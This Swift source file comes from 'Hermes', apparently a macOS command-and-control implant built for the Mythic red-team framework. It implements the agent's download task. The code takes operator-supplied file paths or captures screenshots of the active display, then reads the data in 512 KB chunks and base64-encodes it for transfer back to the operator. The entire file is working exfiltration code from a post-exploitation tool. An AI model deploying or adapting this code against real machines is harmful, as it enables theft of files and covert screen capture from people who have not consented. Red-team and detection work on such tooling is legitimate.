//
//  download.swift
//  Hermes
//
//  Created by Justin Bui on 6/16/21.
//

import Foundation
import Cocoa

func getFileID(job: Job, isScreenshot: Bool) {
    do {
        if (!isScreenshot)
        {
            let fileManager = FileManager.default
            var path = job.parameters
            
            // Strip out quotes if they exist, concept from Apfell agent
            if (path.prefix(1) == "\"") {
                path.removeFirst()
                path.removeLast()
            }
            
            // Check if ~ to base search from user home directory
            if (path.prefix(1) == "~") {
                path = NSString(string: path).expandingTildeInPath
            }
            
            var isDir : ObjCBool = false
            if fileManager.fileExists(atPath: path, isDirectory:&isDir) {
                if !isDir.boolValue {
                    // isFile, get file size, determine number of chunks to send
                    let attributes = try fileManager.attributesOfItem(atPath: path)
                    let size = attributes[FileAttributeKey.size] as! Float
                    let totalChunks = Int(ceil(size/512000))
                    
                    job.downloadFileSize = Int(size)
                    job.downloadChunkNumber = 1
                    job.downloadTotalChunks = totalChunks
                    job.downloadFullPath = path
                    job.downloadIsScreenshot = isScreenshot
                    job.downloadHost = ""
                    job.result = ""
                }
                else {
                    // isDirectory
                    job.result = "Cannot download a directory"
                    job.completed = true
                    job.success = false
                    job.status = "error"
                }
            }
            else {
                job.result = "Could not download \(path), did you specify a full path or a file in your current directory?"
                job.completed = true
                job.success = false
                job.status = "error"
            }
        }
        else if isScreenshot {
            // Get handle to active displays again
            var displayCount: UInt32 = 0;
            var result = CGGetActiveDisplayList(0, nil, &displayCount)
            if (result != CGError.success) {
                job.result = "Error: \(result)"
                job.completed = true
                job.success = false
                job.status = "error"
                return
            }
            let allocated = Int(displayCount)
            let activeDisplays = UnsafeMutablePointer<CGDirectDisplayID>.allocate(capacity: allocated)
            result = CGGetActiveDisplayList(displayCount, activeDisplays, &displayCount)
            
            // Get size of display data
            let screenShot:CGImage = CGDisplayCreateImage(activeDisplays[job.screenshotDisplayNumber])!
            let bitmapRep = NSBitmapImageRep(cgImage: screenShot)
            let jpegData = bitmapRep.representation(using: NSBitmapImageRep.FileType.jpeg, properties: [:])!
            let totalChunks = Int(ceil(Float(jpegData.count)/512000))
            
            job.downloadFileSize = jpegData.count
            job.downloadChunkNumber = 1
            job.downloadTotalChunks = totalChunks
            job.downloadFullPath = ""
            job.downloadIsScreenshot = isScreenshot
            job.downloadHost = ""
            job.result = ""
        }
    }
    catch {
        job.result = "Exception caught: \(error)"
        job.completed = true
        job.success = false
        job.status = "error"
    }
}

func downloadChunk(job: Job) {
    // Open file for reading
    let fileHandle = FileHandle(forReadingAtPath: job.downloadFullPath)
    
    // This will start at 0, then go to 512000, and so on
    let offset = UInt64((job.downloadChunkNumber - 1) * 512000)
    
    // Use seek to move to appropriate position within the file
    fileHandle?.seek(toFileOffset: offset)
    
    // Read as much data as possible 512kb until the last chunk
    if job.downloadChunkNumber < job.downloadTotalChunks {
        // Read data and convert to b64
        let data = (fileHandle?.readData(ofLength: 512000) ?? toData(string: " ")) as Data
        let b64Data = toBase64(data: data)
        
        job.downloadChunkData = b64Data
    }
    // Last chunk read only the remaining data
    else if job.downloadChunkNumber == job.downloadTotalChunks {
        // Read remainder data and convert to b64
        let length = job.downloadFileSize - Int(offset)
        let data = (fileHandle?.readData(ofLength: length) ?? toData(string: " ")) as Data
        let b64Data = toBase64(data: data)
        
        job.downloadChunkData = b64Data
        job.completed = true
        job.success = true
    }
}
